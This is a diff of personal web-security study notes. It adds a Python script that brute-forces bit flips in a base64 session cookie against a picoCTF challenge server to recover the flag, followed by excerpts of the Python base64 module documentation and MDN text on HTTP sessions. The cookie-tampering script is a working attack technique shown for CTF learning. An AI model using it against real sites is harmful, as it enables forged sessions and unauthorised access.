@@ -257,7 +257,86 @@ for in range(50):
 
 
 
- 
+
+
+
+
+## more cookies
+
+```python
+import requests
+
+from base64 import b64decode
+from base64 import b64encode
+
+original_cookie = b64decode('aTM5MThRaTMwalAxTGwrcjRlVjZCZnkybGVzWXJtbmxENlVQOFE5ZlZxd3dpU1FWc3lTc0hxWjZjOXhJY1JqSW1GRlZnK0pOTlV3clBSNWx0bmp1T2JDclgvMFZTb1ducHJESzBacURDblUxVTAxYmUyem9TYWJINzd4SWJjNkQ=')
+original_cookie = bytearray(original_cookie)
+
+def bitFlip(cookie_char_pos: int, bit_pos: int) -> str:
+    altered_cookie = bytearray(original_cookie)
+
+    flipped = altered_cookie[cookie_char_pos] ^ bit_pos
+
+    altered_cookie[cookie_char_pos] = flipped
+    altered_cookie_b64 = b64encode(altered_cookie)
+
+    return altered_cookie_b64.decode("utf-8")
+
+
+
+for cookie_char_pos in range(len(original_cookie)):
+    print(f"checking cookie position {cookie_char_pos}")
+    for bit_pos in range(128):
+        altered_cookie = bitFlip(cookie_char_pos, bit_pos)
+        cookies = {'authname':altered_cookie}
+        r = requests.get("http://mercury.picoctf.net:21553/", cookies=cookies)
+        if("picoCTF{" in r.text):
+            print(r.text)
+```
+
+
+
+
+
+![image-20240501223533656](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240501223533656.png)
+
+
+
+### base64 module
+
+This module provides functions for encoding binary data to printable ASCII characters and decoding such encodings back to binary data. It provides encoding and decoding functions for the encodings specified in [**RFC 4648**](https://datatracker.ietf.org/doc/html/rfc4648.html), which defines the Base16, Base32, and Base64 algorithms
+
+
+
+There are two interfaces provided by this module. The modern interface supports encoding [bytes-like objects](https://docs.python.org/3/glossary.html#term-bytes-like-object) to ASCII [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes), and decoding [bytes-like objects](https://docs.python.org/3/glossary.html#term-bytes-like-object) or strings containing ASCII to [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes)
+
+
+
+#### `bytes-like object`
+
+An object that supports the [Buffer Protocol](https://docs.python.org/3/c-api/buffer.html#bufferobjects) and can export a C-[contiguous](https://docs.python.org/3/glossary.html#term-contiguous) buffer. This includes all [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes), [`bytearray`](https://docs.python.org/3/library/stdtypes.html#bytearray), and [`array.array`](https://docs.python.org/3/library/array.html#array.array) objects, as well as many common [`memoryview`](https://docs.python.org/3/library/stdtypes.html#memoryview) objects. Bytes-like objects can be used for various operations that work with binary data; these include compression, saving to a binary file, and sending over a socket.
+
+
+
+
+
+#### `base64.base64encode(s, altchars=None)`
+
+Encode the [bytes-like object](https://docs.python.org/3/glossary.html#term-bytes-like-object) *s* using Base64 and return the encoded [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes).
+
+Optional *altchars* must be a [bytes-like object](https://docs.python.org/3/glossary.html#term-bytes-like-object) of length 2 which specifies an alternative alphabet for the `+` and `/` characters. This allows an application to e.g. generate URL or filesystem safe Base64 strings. The default is `None`, for which the standard Base64 alphabet is used.
+
+
+
+
+
+#### `base64.b64decode(s, altchars=None, validate=False)`
+
+Decode the Base64 encoded bytes-like object or ASCII string *s* and return the decoded bytes
+
+
+
+
 
 
 
@@ -418,21 +497,39 @@ With `Strict`, the browser only sends the cookie with requests from the cookie's
 
 
 
+## Session 
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Session#establishing_a_connection
 
 
 
+In client-server protocols, like HTTP, sessions consist of three phases:
+
+1. The client establishes a TCP connection (or the appropriate connection if the transport layer is not TCP).
+2. The client sends its request, and waits for the answer.
+3. The server processes the request, sending back its answer, providing a status code and appropriate data.
+
+As of HTTP/1.1, the connection is no longer closed after completing the third phase, and the client is now granted a further request: this means the second and third phases can now be performed any number of times.
 
 
 
+### Establish a connection
+
+In client-server protocols, it is the client which establishes the connection. Opening a connection in HTTP means initiating a connection in the underlying transport layer, usually this is TCP.
+
+With TCP the default port, for an HTTP server on a computer, is port 80. Other ports can also be used, like 8000 or 8080. 
+
+**Note:** The client-server model does not allow the server to send data to the client without an explicit request for it. However, various Web APIs enable this use case, including the [Push API](https://developer.mozilla.org/en-US/docs/Web/API/Push_API), [Server-sent events](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events), and the [WebSockets API](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API).
 
 
 
+### Send a client request
 
+Once the connection is established, the user-agent can send the request (a user-agent is typically a web browser, but can be anything else, a crawler, for example).
 
+A client request can be divided into 3 blocks:
 
-
-
-
+- The first line contains a request method followed by its parameters.
 
 
 
